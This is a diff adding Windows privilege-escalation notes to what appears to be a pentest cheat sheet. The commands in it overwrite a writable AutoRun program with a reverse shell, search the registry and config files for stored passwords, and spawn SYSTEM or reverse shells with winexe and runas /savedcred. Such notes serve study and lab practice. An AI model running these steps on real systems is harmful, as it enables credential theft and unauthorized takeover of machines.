@@ -180,7 +180,63 @@ net stop dllsvc
 net start dllsvc
 
 ```
+###### Registry
+```
+AutoRun application that are writable 
 
+- reg query HKLM\SOFTWARE\MICROSOFT\WINDOWS\VERSION\Run 
+
+Check acesss
+- .\accesschk.exe \accepteula -wvu "C:\PATH\TO\VULN\prog.exe"
+
+Back up the oringinal 
+
+Overwirte the exe 
+- copy /Y reverse.exe "C:\PATH\TO\VULN\prog.exe"
+
+Restart windows
+```
+###### Always install evavated
+```
+If these are enabled
+Query the registeR
+```
+###### Passwords
+```
+HKLM = Local Machine
+HKCU = Current User
+
+Query the registry
+- reg query HKLM /f password /t REG_SZ /s
+- reg query HKCU /f password /t REG_SZ /s
+
+Verify found passwords
+- reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" /s  ###these are not copy n paste, paths are always unique
+- reg query "HKCU\software\place\PuTTY\sEssions" /s
+
+to spawn shell
+winexe -u --system 'admin%passowrd123' //targetip cmd.exe
+
+---------------------------------------------------
+RunAs
+
+Check stored credentials
+- cmdkey /list
+
+to pop shell
+runas /savedcred /user:admin C:\reverseshell.exe  
+---------------------------------------------------
+Config files
+Recurisvily searcg files in the CWD with 'pass' or ending in .config
+- dir /s *pass* == *.config
+
+do the same but contain password and end in .xml .ini .txt 
+- findstr \si password *.xml *.ini *.txt 
+
+
+
+
+```
 
 ###### Enumerating Unmounted Disks for Windows
 ```
